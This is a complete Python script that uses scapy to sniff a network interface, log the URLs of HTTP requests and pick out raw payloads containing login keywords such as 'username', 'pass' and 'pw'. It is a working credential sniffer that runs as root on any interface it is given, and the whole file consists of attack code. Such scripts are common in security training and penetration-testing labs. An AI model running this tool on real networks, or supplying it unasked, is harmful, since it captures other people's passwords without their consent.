#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http
import sys
import os

#Check for root
if os.getuid() != 0:
   sys.exit("[-]Please run with root permission!")

#Checks to see if interface was supplied
if len(sys.argv) != 2:
    print("[!]Please supply an interface to sniff from!")
    print("[!]Usage: sniff.py <interface>")
    sys.exit()

#packet sniffer function, sends packet data to filter_packet function
def sniff_packet(interface):
    scapy.sniff(iface=interface, store=False, prn=filter_packet)

#gets urls from http packets
def get_http_url(packet):
   return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

#detects common http paramaters for username and password in raw data payload and returns any if found
def get_creds(packet):
    if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keyword = ["username", "uname", "user", "un", "login", "password", "pass", "passwd", "pw"]
            for item in keyword:
                if item in load:
                    return load
                    

#filters through packet looking for urls and credentials and prints the results if any
def filter_packet(packet):
    
    if packet.haslayer(http.HTTPRequest):
        
        url = get_http_url(packet)
    
        print("[+]HTTP Request found! >>> " + url.decode())
        
        creds = get_creds(packet)
        if creds:
            print("\n" + "*" * 75)
            print("[+]!!!! Possible username/password detected! >>> " + creds )
            print("*" * 75 + "\n")

    
#try block to ensure interface is valid
try:
    print("[!]Begin sniffing from interface: " + sys.argv[1])
    print("*" * 75)
    sniff_packet(sys.argv[1])
    
except:
    sys.exit("[-]Please use a real interface")
    


   